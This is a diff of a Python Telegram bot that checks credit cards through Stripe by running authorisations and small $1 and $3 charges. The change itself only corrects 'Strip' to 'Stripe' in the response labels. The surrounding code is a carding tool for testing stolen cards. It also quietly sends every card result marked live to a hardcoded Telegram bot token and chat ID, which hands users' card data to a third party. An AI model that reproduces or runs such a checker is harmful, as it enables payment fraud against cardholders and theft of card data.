@@ -19,9 +19,9 @@ def send_welcome ( message ) :
     bot.reply_to ( message , """
 	<b>𝙒𝙀𝙇𝘾𝙊𝙈 𝙄𝙉 𝙐𝙎 𝘽𝙊𝙏</b>
 	-------------------------
-	/cc  -------> 𝙂𝙀𝙏 1   <b>Ｓｔｒｉｐ　Ａｕｔｈ </b>
-	/stg -------> 𝙂𝙀𝙏 2 <b>Ｓｔｒｉｐ Ｃｈａｒｇｅ １＄</b>
-	/st  -------> 𝙂𝙀𝙏 3 <b>Ｓｔｒｉｐ Ｃｈａｒｇｅ 3＄</b>
+	/cc  -------> 𝙂𝘼𝙏 1   <b>Ｓｔｒｉｐe　Ａｕｔｈ </b>
+	/stg -------> 𝙂𝘼𝙏 2 <b>Ｓｔｒｉｐe Ｃｈａｒｇｅ １＄</b>
+	/st  -------> 𝙂𝘼𝙏 3 <b>Ｓｔｒｉｐe Ｃｈａｒｇｅ 3＄</b>
 	/bin -------> 𝘾𝙃𝙀𝘼𝙆 𝘽𝙄𝙉
 	/id  -------> 𝙂𝙀𝙏 𝙔𝙊𝙐𝙍 𝙄𝘿
 	-----------------------
@@ -70,13 +70,13 @@ def snd_welcome ( message ) :
                 if 'Declined' or 'Card Doesnt Support Purchase' or "DEAD" or "Generic declined" or "#Declined" or "Your card number is incorrect." or "Your card was declined." or "stolen_card" in rr :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
+                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
                     msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
                 else :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
+                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
                     msg = '|-𝘾𝘾 :\t' + xx + shm + rps + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
@@ -169,7 +169,7 @@ def snd_welcome ( message ) :
                 if 'Generic Decline' in rr :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
+                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
                     msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
                 elif 'Request rate limit exceeded.' or 'rate_limit' :
@@ -177,7 +177,7 @@ def snd_welcome ( message ) :
                 else :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
+                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
                     msg = '|-𝘾𝘾 :\t' + xx + shm + rps + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
@@ -283,7 +283,7 @@ def snd_welcome ( message ) :
                         us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                             message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
-                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' 
+                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
                         status = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>INSUFFICIENT FUNDS ✅</b>\n'
                         msg = '-𝘾𝘾 : ' + xx + status + rps + rp + shm + tp + lvel + cont + us + date + auther
                         bot.reply_to ( message , msg )
@@ -292,14 +292,14 @@ def snd_welcome ( message ) :
                         us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                             message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>❌\n'
-                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 3$</b>' + '\n'
+                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
                         msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
                         bot.reply_to ( message , msg )
                 else :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                     rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>✅\n'
-                    rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 3$</b>' + '\n'
+                    rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
                     msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
